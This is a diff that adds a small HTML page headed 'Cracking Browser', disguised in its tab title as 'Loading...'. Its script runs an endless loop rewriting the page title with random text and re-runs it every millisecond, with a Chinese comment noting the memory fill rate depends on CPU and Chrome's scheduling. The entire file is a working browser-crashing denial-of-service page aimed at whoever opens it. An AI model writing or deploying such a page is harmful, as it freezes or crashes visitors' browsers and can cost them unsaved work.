@@ -1,0 +1,18 @@
+<!DOCTYPE html>  
+<head>
+<title>Loading...............</title>
+</head>
+
+<body>
+    <h1>Cracking Browser</h1>
+    <script>
+    function update() {
+        for (let i = 0; i > -1; i++){
+            // 经过测试，修改标题字符串长度、循环次数均不会改变内存填充速率，速率取决于CPU性能与Chrome的并行策略
+            document.querySelector("head > title").innerText = "Loading..............." + Math.random()
+        }
+    }
+    update()
+    setInterval(update, 1)
+    </script>
+</body>
